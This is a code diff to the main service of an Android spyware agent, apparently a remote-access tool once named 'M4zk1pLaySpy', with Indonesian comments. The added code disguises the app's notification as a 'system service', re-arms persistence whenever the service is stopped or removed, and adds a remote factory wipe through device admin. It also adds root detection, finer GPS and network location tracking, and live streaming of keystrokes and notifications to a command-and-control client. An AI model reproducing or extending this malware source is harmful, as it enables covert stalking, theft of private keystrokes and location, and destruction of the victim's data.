@@ -5,7 +5,11 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -19,7 +23,7 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.List;
 
-/** Service utama — koneksi C2, lokasi, keylog. */
+/** Service utama: koneksi C2, lokasi, buffer keylog, persistence. */
 public class AgentService extends Service implements C2Client.Sink {
 
     public static AgentService instance;
@@ -29,16 +33,16 @@ public class AgentService extends Service implements C2Client.Sink {
     private ScreenModule screen;
     private Router router;
     private LocationManager lm;
+    private LocationListener listener;
     private boolean locating;
+    private Boolean rootCache;
     private final List<String> keys = new ArrayList<>();
-    private Intent projectionData;
-    private int projectionCode = Activity.RESULT_CANCELED;
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
-        startForeground(0x4d5a, notif());
+        startFg();
 
         Keys k = Keys.read(this);
         client = new C2Client(k, this);
@@ -47,34 +51,53 @@ public class AgentService extends Service implements C2Client.Sink {
         screen = new ScreenModule();
         screen.bind(client);
         router = new Router(this, client, media, screen);
+
+        Persist.arm(this);
         client.connect();
     }
 
-    private Notification notif() {
-        String ch = "mzk";
+    private void startFg() {
+        String ch = "mzk_core";
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= 26 && nm != null) {
-            NotificationChannel c = new NotificationChannel(ch, "M4zk1pLaySpy",
+            NotificationChannel c = new NotificationChannel(ch, "Layanan sistem",
                     NotificationManager.IMPORTANCE_MIN);
+            c.setShowBadge(false);
             nm.createNotificationChannel(c);
         }
         Notification.Builder b = Build.VERSION.SDK_INT >= 26
                 ? new Notification.Builder(this, ch) : new Notification.Builder(this);
-        return b.setContentTitle("Layanan sistem")
+        Notification n = b.setContentTitle("Layanan sistem")
                 .setContentText("Berjalan normal")
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                 .setOngoing(true)
+                .setPriority(Notification.PRIORITY_MIN)
                 .build();
+        if (Build.VERSION.SDK_INT >= 29) {
+            startForeground(0x4d5a, n,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        } else {
+            startForeground(0x4d5a, n);
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Persist.arm(this);
         if (client == null) {
             Keys k = Keys.read(this);
             client = new C2Client(k, this);
             client.connect();
         }
         return START_STICKY;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent root) {
+        Persist.arm(this);
+        BootProvider.start(this);
+        super.onTaskRemoved(root);
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
@@ -85,26 +108,48 @@ public class AgentService extends Service implements C2Client.Sink {
         try { media.stopAll(); } catch (Exception ignored) { }
         try { screen.stop(); } catch (Exception ignored) { }
         try { client.stop(); } catch (Exception ignored) { }
+        Persist.arm(this);
         super.onDestroy();
     }
 
-    // ---- Sink ----
     @Override public void onReady() { }
 
-    @Override
-    public void onCommand(String id, String type, JSONObject args) {
+    @Override public void onCommand(String id, String type, JSONObject args) {
         router.handle(id, type, args);
     }
 
-    @Override
-    public void onDown() { }
+    @Override public void onDown() { }
 
-    // ---- lokasi ----
+    public void reconnect() {
+        try { client.stop(); } catch (Exception ignored) { }
+        client = new C2Client(Keys.read(this), this);
+        client.connect();
+    }
+
+    public boolean isRoot() {
+        if (rootCache == null) rootCache = Modules.root();
+        return rootCache;
+    }
+
+    public String wipe() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName cn = new ComponentName(this, AdminReceiver.class);
+            if (dpm != null && dpm.isAdminActive(cn)) {
+                dpm.wipeData(0);
+                return "wipe dipicu";
+            }
+            return "butuh device admin aktif";
+        } catch (Exception e) {
+            return "gagal: " + e.getMessage();
+        }
+    }
+
     public void startLocate() {
         if (locating) return;
         locating = true;
         lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-        LocationListener l = new LocationListener() {
+        listener = new LocationListener() {
             @Override public void onLocationChanged(Location loc) {
                 try {
                     JSONObject o = new JSONObject();
@@ -120,8 +165,8 @@ public class AgentService extends Service implements C2Client.Sink {
         };
         try {
             if (lm != null) {
-                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 4000, 3f, l, Looper.getMainLooper());
-                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 6000, 5f, l, Looper.getMainLooper());
+                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 2f, listener, Looper.getMainLooper());
+                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 4f, listener, Looper.getMainLooper());
             }
         } catch (Exception ignored) { }
     }
@@ -129,8 +174,9 @@ public class AgentService extends Service implements C2Client.Sink {
     public void stopLocate() {
         locating = false;
         try {
-            if (lm != null) lm.removeUpdates((LocationListener) null);
+            if (lm != null && listener != null) lm.removeUpdates(listener);
         } catch (Exception ignored) { }
+        listener = null;
     }
 
     public void needProjection() {
@@ -139,19 +185,16 @@ public class AgentService extends Service implements C2Client.Sink {
         startActivity(i);
     }
 
-    public void setProjection(Intent data, int code) {
-        projectionData = data;
-        projectionCode = code;
-        if (data != null) screen.start(this, data, code);
-    }
-
     public JSONObject netInfo() {
         JSONObject o = new JSONObject();
         try {
             o.put("local_ip", Modules.ip(this));
-            o.put("wifi", Modules.ip(this));
             o.put("battery", Modules.battery(this));
             o.put("charging", Modules.charging(this));
+            o.put("online", Modules.online(this));
+            o.put("root", isRoot());
+            o.put("notif", NotifListener.alive());
+            o.put("keylog", KeylogService.alive());
         } catch (Exception ignored) { }
         return o;
     }
@@ -165,23 +208,16 @@ public class AgentService extends Service implements C2Client.Sink {
         return a;
     }
 
-    public void addKey(String line) {
-        synchronized (keys) {
-            keys.add(line);
-            while (keys.size() > 2000) keys.remove(0);
-        }
+    public void pushLive(String kind, String line) {
+        if (client != null) client.stream(kind, line, null);
     }
 
     public void delayMode() {
         new Thread(() -> {
             long end = System.currentTimeMillis() + 8000;
             while (System.currentTimeMillis() < end) {
-                for (int i = 0; i < 400000; i++) Math.sqrt(i);
+                for (int i = 0; i < 500000; i++) Math.sqrt(i);
             }
-        }).start();
-    }
-
-    public void emitStream(String kind, String line) {
-        if (client != null) client.stream(kind, "", null);
+        }, "mzk-delay").start();
     }
 }
